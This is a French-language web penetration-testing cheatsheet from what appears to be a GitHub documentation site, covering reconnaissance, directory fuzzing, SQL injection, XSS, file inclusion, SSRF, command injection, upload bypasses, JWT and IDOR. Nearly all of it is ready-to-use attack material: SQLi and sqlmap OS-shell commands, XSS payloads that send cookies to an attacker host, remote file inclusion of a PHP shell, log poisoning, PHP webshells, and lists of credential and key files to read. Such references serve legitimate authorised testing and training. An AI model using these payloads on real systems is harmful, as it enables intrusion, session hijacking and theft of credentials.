# Web Pentesting Cheatsheet

Référence rapide des techniques et commandes essentielles pour les tests d'intrusion sur les applications web.


## Reconnaissance Web

::: code-group
```bash [Découverte]
# Technologies utilisées
whatweb <target>
wappalyzer <target>

# Headers HTTP
curl -I <target>
curl -v <target>

# Robots & Sitemap
curl <target>/robots.txt
curl <target>/sitemap.xml

# Certificat SSL
openssl s_client -connect <target>:443
```
```bash [Sous-domaines]
# Gobuster DNS
gobuster dns -d <domain> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

# Amass
amass enum -d <domain>

# Sublist3r
sublist3r -d <domain>

# ffuf
ffuf -u http://FUZZ.<domain> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```
```bash [Fingerprinting]
# CMS
whatweb -a 3 <target>
wpscan --url <target>
droopescan scan drupal -u <target>
joomscan -u <target>

# WAF
wafw00f <target>
nmap -p80,443 --script http-waf-detect <target>
```

:::


## Enumération de Répertoires

::: code-group
```bash [Gobuster]
# Répertoires
gobuster dir -u <target> -w /usr/share/wordlists/dirb/common.txt

# Avec extensions
gobuster dir -u <target> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak

# Avec authentification
gobuster dir -u <target> -w /usr/share/wordlists/dirb/common.txt -U user -P password

# HTTPS sans vérification SSL
gobuster dir -u <target> -w /usr/share/wordlists/dirb/common.txt -k
```
```bash [ffuf]
# Répertoires
ffuf -u <target>/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Avec extensions
ffuf -u <target>/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.html,.bak

# Filtrer par taille
ffuf -u <target>/FUZZ -w wordlist.txt -fs 0

# Filtrer par code HTTP
ffuf -u <target>/FUZZ -w wordlist.txt -fc 404

# Virtual hosts
ffuf -u http://<target> -H "Host: FUZZ.<domain>" -w subdomains.txt
```
```bash [Dirsearch]
# Scan basique
dirsearch -u <target>

# Avec extensions
dirsearch -u <target> -e php,txt,html,bak,zip

# Threads
dirsearch -u <target> -t 50
```

:::


## SQL Injection

### Détection manuelle
```
# Test basique
 '
 ''
 `
 ')
 "))
 ' OR '1'='1
 ' OR '1'='1'--
 ' OR '1'='1'/*
 admin'--
 admin' #
 ' OR 1=1--
```

### SQLMap

::: code-group
```bash [GET]
# Paramètre GET
sqlmap -u "http://<target>/page?id=1"

# Avec cookie
sqlmap -u "http://<target>/page?id=1" --cookie="session=abc123"

# Dump base de données
sqlmap -u "http://<target>/page?id=1" --dbs
sqlmap -u "http://<target>/page?id=1" -D dbname --tables
sqlmap -u "http://<target>/page?id=1" -D dbname -T tablename --dump
```
```bash [POST]
# Paramètre POST
sqlmap -u "http://<target>/login" --data="user=admin&pass=test"

# Avec Burp request
sqlmap -r request.txt

# Cibler un paramètre
sqlmap -r request.txt -p username
```
```bash [Options avancées]
# Bypass WAF
sqlmap -u "<target>" --tamper=space2comment
sqlmap -u "<target>" --tamper=between,randomcase,space2comment

# OS Shell
sqlmap -u "<target>" --os-shell

# Upload webshell
sqlmap -u "<target>" --file-write=/tmp/shell.php --file-dest=/var/www/html/shell.php

# Level / Risk
sqlmap -u "<target>" --level=5 --risk=3
```

:::

### Payloads SQLi courants
```sql
 -- Union Based
 ' UNION SELECT NULL--
 ' UNION SELECT NULL,NULL--
 ' UNION SELECT username,password FROM users--

 -- Error Based
 ' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
 ' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

 -- Blind Boolean
 ' AND 1=1--
 ' AND 1=2--
 ' AND SUBSTRING(username,1,1)='a'--

 -- Time Based
 '; WAITFOR DELAY '0:0:5'--
 ' AND SLEEP(5)--
```

---

## XSS (Cross-Site Scripting)

### Payloads de base
```html
 <!-- Reflected / Stored -->
 <script>alert(1)</script>
 <script>alert(document.cookie)</script>
 <img src=x onerror=alert(1)>
 <svg onload=alert(1)>
 <body onload=alert(1)>
 <iframe src="javascript:alert(1)">
 "><script>alert(1)</script>
 '><script>alert(1)</script>

 <!-- Bypass filtres -->
 <ScRiPt>alert(1)</ScRiPt>
 <script>alert`1`</script>
 <img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
```

### Vol de cookies
```html
 <!-- Payload -->
 <script>document.location='http://<ATK>/steal?c='+document.cookie</script>
 <img src=x onerror="fetch('http://<ATK>/steal?c='+document.cookie)">

 <!-- Réception sur l'attaquant -->
 python3 -m http.server 80
 nc -lvnp 80
```

### XSS to RCE (BeEF)
```bash
# Lancer BeEF
cd /usr/share/beef-xss && ./beef

# Hook
<script src="http://<ATK>:3000/hook.js"></script>
```

---

## LFI (Local File Inclusion)

### Payloads
```
 # Basique
 ?page=../../../etc/passwd
 ?file=....//....//....//etc/passwd

 # Null byte (PHP < 5.3)
 ?page=../../../etc/passwd%00

 # Path traversal encodé
 ?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
 ?page=..%252f..%252f..%252fetc%252fpasswd

 # Wrappers PHP
 ?page=php://filter/convert.base64-encode/resource=index.php
 ?page=php://input
 ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
```

### Fichiers cibles LFI
```
 /etc/passwd
 /etc/shadow
 /etc/hosts
 /etc/hostname
 /etc/crontab
 /proc/self/environ
 /proc/self/cmdline
 /var/log/apache2/access.log
 /var/log/nginx/access.log
 /var/log/auth.log
 /home/<user>/.bash_history
 /home/<user>/.ssh/id_rsa
 /var/www/html/config.php
 /var/www/html/.env
 C:\Windows\System32\drivers\etc\hosts
 C:\xampp\htdocs\config.php
 C:\inetpub\wwwroot\web.config
```

### LFI to RCE Log Poisoning
```bash
# 1. Injecter du code dans les logs
curl "http://<target>/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"

# 2. Inclure le fichier de log
http://<target>/page?file=/var/log/apache2/access.log&cmd=id
```


## RFI (Remote File Inclusion)
```bash
# Serveur HTTP attaquant
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server 8080

# Inclusion
http://<target>/page?file=http://<ATK>:8080/shell.php&cmd=id
http://<target>/page?file=http://<ATK>:8080/shell.php&cmd=whoami
```


## SSRF (Server-Side Request Forgery)

### Payloads de base
```
 # Accès services internes
 http://127.0.0.1/
 http://localhost/
 http://127.0.0.1:8080/admin
 http://192.168.1.1/

 # Cloud metadata
 http://169.254.169.254/latest/meta-data/
 http://169.254.169.254/latest/meta-data/iam/security-credentials/
 http://metadata.google.internal/computeMetadata/v1/

 # Bypass filtres
 http://127.1/
 http://0.0.0.0/
 http://[::1]/
 http://0x7f000001/
 http://2130706433/

 # Protocoles alternatifs
 file:///etc/passwd
 dict://127.0.0.1:6379/info
 gopher://127.0.0.1:25/
```

### SSRF Enumération interne
```bash
# Fuzzing des ports internes
ffuf -u "http://<target>/fetch?url=http://127.0.0.1:FUZZ" \
  -w /usr/share/wordlists/SecLists/Fuzzing/ports.txt \
  -fs <normal_size>

# Fuzzing des IPs internes
ffuf -u "http://<target>/fetch?url=http://192.168.1.FUZZ" \
  -w <(seq 1 254) -fs <normal_size>
```


## Command Injection

### Payloads
```bash
# Séparateurs
; whoami
| whoami
|| whoami
& whoami
&& whoami
`whoami`
$(whoami)

# Bypass filtres espaces
{whoami}
whoami%09
cat${IFS}/etc/passwd
cat$IFS/etc/passwd

# Bypass filtres mots-clés
w'h'o'a'm'i
who$()ami
/bin/w*
```

### Outils
```bash
# Commix automatisé
commix -u "http://<target>/page?cmd=test"
commix -r request.txt
```


## Path Traversal
```
 # Linux
 ../../../../etc/passwd
 ../../../etc/shadow
 ../../proc/self/environ

 # Windows
 ..\..\..\Windows\System32\drivers\etc\hosts
 ..\..\..\Windows\win.ini

 # Encodage
 %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
 %2e%2e/%2e%2e/%2e%2e/etc/passwd
 ..%2f..%2f..%2fetc%2fpasswd
 ....//....//....//etc/passwd
```


## File Upload Bypass
```bash
# Extensions alternatives
shell.php → shell.php5, shell.phtml, shell.phar, shell.php.jpg

# Double extension
shell.jpg.php
shell.php.jpg

# Content-Type bypass
Content-Type: image/jpeg  (avec contenu PHP)

# Null byte
shell.php%00.jpg

# Contenu minimal PHP
<?php system($_GET['cmd']); ?>
<?=system($_GET['cmd'])?>
<?php passthru($_GET['cmd']); ?>
```


## JWT Attacks
```bash
# Decode JWT
echo "<header>.<payload>.<signature>" | cut -d. -f2 | base64 -d

# Alg:none
# Modifier le header : {"alg":"none","typ":"JWT"}
# Supprimer la signature

# Bruteforce secret
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# jwt_tool
jwt_tool <token>
jwt_tool <token> -T   # tamper
jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt  # crack
```


## IDOR Insecure Direct Object Reference
```
 # Tester les IDs
 GET /api/user/1
 GET /api/user/2
 GET /api/user/3

 # GUID / UUID
 GET /api/user/550e8400-e29b-41d4-a716-446655440000

 # Paramètres cachés
 ?user_id=1337
 ?account=admin
 ?role=admin

 # Headers
 X-User-ID: 1337
 X-Original-URL: /admin
 X-Forwarded-For: 127.0.0.1
```


## Outils Essentiels

### Burp Suite Raccourcis

| Action | Raccourci |
|---|---|
| Intercepter | `Ctrl+I` |
| Forward | `F` |
| Drop | `D` |
| Envoyer au Repeater | `Ctrl+R` |
| Envoyer à l'Intruder | `Ctrl+I` |
| Chercher | `Ctrl+F` |

### Nikto
```bash
# Scan basique
nikto -h <target>

# Avec SSL
nikto -h <target> -ssl

# Port spécifique
nikto -h <target> -p 8080

# Output
nikto -h <target> -o results.txt -Format txt
```

### WPScan
```bash
# Scan basique
wpscan --url <target>

# Enum users
wpscan --url <target> -e u

# Enum plugins
wpscan --url <target> -e p

# Bruteforce
wpscan --url <target> -U admin -P /usr/share/wordlists/rockyou.txt
```


## Headers de Sécurité
```bash
# Vérifier les headers
curl -I <target>

# Headers importants à analyser
Content-Security-Policy
X-Frame-Options
X-XSS-Protection
Strict-Transport-Security
X-Content-Type-Options
Access-Control-Allow-Origin
Set-Cookie (Secure, HttpOnly, SameSite)
```


## Reverse Shell Web
```php
 # Webshell PHP minimal
 <?php system($_GET['cmd']); ?>
 <?=`$_GET[cmd]`?>

 # Webshell PHP complet
 <?php
 if(isset($_REQUEST['cmd'])){
     echo "<pre>";
     $cmd = ($_REQUEST['cmd']);
     system($cmd);
     echo "</pre>";
     die;
 }
 ?>

 # Usage
 http://<target>/shell.php?cmd=id
 http://<target>/shell.php?cmd=whoami
 http://<target>/shell.php?cmd=cat+/etc/passwd
```


::: info Tips 

- Toujours commencer par `whatweb` et `gobuster` avant d'attaquer manuellement
- Tester systématiquement les paramètres GET, POST, Headers et Cookies
- Utiliser Burp Suite pour intercepter et modifier toutes les requêtes
- Les endpoints `/api/`, `/admin/`, `/backup/`, `/.git/` sont souvent oubliés
- `ffuf` avec `-fs` pour filtrer les faux positifs par taille de réponse
- Tester le IDOR sur tous les IDs numériques et UUIDs visibles
- Les fichiers `.env`, `config.php`, `web.config` exposés sont critiques
- Ne jamais oublier de tester les sous-domaines surface d'attaque souvent négligée

:::

## Notes
```
 # Notes terrain
```

## Ressources

- [HackTricks Web Pentesting](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web)
- [PayloadsAllTheThings Web](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [SecLists](https://github.com/danielmiessler/SecLists)
- [RevShells](https://www.revshells.com/)



<div class="page-footer">

<span>![Last updated](https://img.shields.io/github/last-commit/Hackthus/The-Hackers-237?label=Last%20updated&style=flat-square&color=gray)</span>

<span>[![Edit this page on GitHub](https://img.shields.io/badge/✏️%20Edit%20this%20page-GitHub-black?style=flat-square&logo=github)](https://github.com/Hackthus/The-Hackers-237/edit/main/docs/cheatsheets/web.md)</span>

</div>